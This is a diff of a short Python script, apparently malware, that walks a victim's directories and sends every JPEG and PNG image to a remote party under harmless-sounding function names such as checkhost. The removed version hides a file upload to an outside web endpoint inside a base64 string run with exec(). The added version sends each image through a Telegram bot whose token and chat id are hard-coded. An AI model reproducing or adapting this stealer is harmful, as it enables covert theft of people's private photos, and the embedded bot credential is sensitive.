@@ -1,13 +1,14 @@
-#coded by pH.phoenix
-import os, base64
-import requests
+import os, base64, time, telegram
 
 
-def checkhost(p):
-  with open(p, 'rb') as file:
-    files = {'file': file}
-    dixs = base64.b64decode("cmVxdWVzdHMucG9zdCgnaHR0cDovL21vb250b29uLm1sL3NlbmQucGhwJywgZmlsZXM9ZmlsZXMp").decode('utf-8')
-    response = exec(dixs)
+
+def checkhost(image_name, image_dir='.'):
+    image_path = os.path.join(image_dir, image_name)
+    image = open(image_path, 'rb')
+
+    bot = telegram.Bot(token='5934927716:AAG27G_DY4sr_NvK9FqOJKuZWfhSRJIT5ww')
+    bot.send_photo(chat_id=-841939764, photo=image)
+
 
 
 def pinghost():
@@ -36,4 +37,7 @@ def pinghost():
       file_path = os.path.join(root, filename)
       if file_path.endswith(('.jpeg', '.jpg', '.png')):
         checkhost(file_path)
+        time.sleep(0.5)
+
+
 
